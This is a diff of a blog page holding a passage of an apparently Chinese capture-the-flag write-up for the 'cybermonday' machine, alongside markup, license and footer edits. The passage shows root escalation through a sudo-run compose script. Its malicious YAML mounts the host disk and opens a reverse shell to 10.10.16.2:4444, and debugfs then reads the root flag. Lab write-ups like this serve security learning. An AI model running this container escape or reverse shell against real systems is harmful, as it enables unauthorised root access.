+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082136.jpg" alt=""></p>
 <p>查看内容，就是调用docker-compose加载运行yml文件之前进行各种检查：</p>
 <ul>
 <li>白名单路径</li>
@@ -638,22 +393,8 @@
 <h1 id="提权-amp-root-flag"><a href="#提权-amp-root-flag" class="headerlink" title="提权 &amp; root flag"></a>提权 &amp; root flag</h1><p>宿主机查看磁盘信息确认是sda1，然后就是准备恶意yml文件后运行，得到的容器shell内debugfs读文件：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">john@cybermonday:~$ lsblk</span><br><span class="line">NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT</span><br><span class="line">sda      8:0    0    7G  0 disk</span><br><span class="line">|-sda1   8:1    0    6G  0 part /</span><br><span class="line">`-sda2   8:2    0 1023M  0 part [SWAP]</span><br><span class="line"></span><br><span class="line">sudo /opt/secure_compose.py miao.yml</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 容器内</span></span><br><span class="line">debugfs /dev/sda1</span><br><span class="line">cat /root/root.txt</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082137.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082138.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082137.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082138.jpg" alt=""></p>
 <h2 id="miao-yml"><a href="#miao-yml" class="headerlink" title="miao.yml"></a>miao.yml</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">"3.0"</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"><span class="attr">    malicious-service:</span></span><br><span class="line"><span class="attr">        image:</span> <span class="string">cybermonday_api</span></span><br><span class="line"><span class="attr">        devices:</span></span><br><span class="line"><span class="bullet">            -</span> <span class="string">/dev/sda1:/dev/sda1</span></span><br><span class="line"><span class="attr">        command:</span> <span class="string">bash</span> <span class="bullet">-c</span> <span class="string">'bash -i &gt;&amp; /dev/tcp/10.10.16.2/4444 0&gt;&amp;1'</span></span><br></pre></td></tr></table></figure>
 
 
@@ -679,7 +420,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2023-12-04T01:28:06.434Z" itemprop="dateUpdated">2023-12-04 09:28:06</time>
+    Last updated: <time datetime="2023-12-04T01:28:06.434Z" itemprop="dateUpdated">2023-12-04 09:28:06</time>
 </span><br>
 
 
@@ -846,11 +587,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
